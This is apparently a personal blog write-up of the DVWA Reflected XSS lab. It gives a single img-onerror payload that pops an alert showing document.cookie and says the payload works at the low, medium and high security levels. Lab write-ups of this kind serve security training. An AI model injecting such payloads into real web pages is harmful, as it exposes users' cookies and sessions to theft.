---
title: "Reflected Cross Site Scripting (XSS) - DVWA"
description: ""
summary: "Trigger an alert pop-up with cookie values using Reflected XSS."
date: 2022-08-17
draft: false
author: "Aftab Sama" # ["Me", "You"] # multiple authors
tags: ["writeups", "challenge", "DVWA", "Reflected XSS"]
canonicalURL: ""
showToc: true
TocOpen: false
TocSide: 'right'  # or 'left'
weight: 10
# aliases: ["/first"]
hidemeta: false
comments: false
disableHLJS: true # to disable highlightjs
disableShare: true
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
# UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
# editPost:
#     URL: "https://github.com/"
#     Text: "Suggest Changes" # edit text
#     appendFilePath: true # to append file path to Edit link
---


### **Security level: low**

we have name field which is reflecting on page.

payload=`<img src=x onerror="alert(document.cookie)">`

It triggers an alert pop up with cookie value.


### **Security level: medium**

_payload of low level also works here: _

payload=`<img src=x onerror="alert(document.cookie)">`


### **Security level: high**

_payload of low level also works here: _

payload=`<img src=x onerror="alert(document.cookie)">`

Happy Hacking
